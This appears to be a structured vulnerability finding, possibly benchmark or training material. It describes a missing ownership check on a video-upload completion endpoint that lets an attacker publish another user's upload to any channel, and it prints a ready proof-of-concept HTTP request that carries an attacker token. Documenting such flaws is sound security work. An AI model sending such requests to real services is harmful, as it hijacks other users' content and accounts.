diagnosis: The endpoint receives uploadId and targetChannelId and enqueues a video publication job to BullMQ without validating that the authenticated user owns targetChannelId or uploadId. An attacker can claim another user's completed video upload and publish it to an arbitrary channel.
exploit_request:
POST /api/tus/videos/tus_vid_upload_1048/complete HTTP/1.1
Host: creator.videohub.tv
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"targetChannelId": "chn_unauthorized_victim_01", "resolution": "4K"}
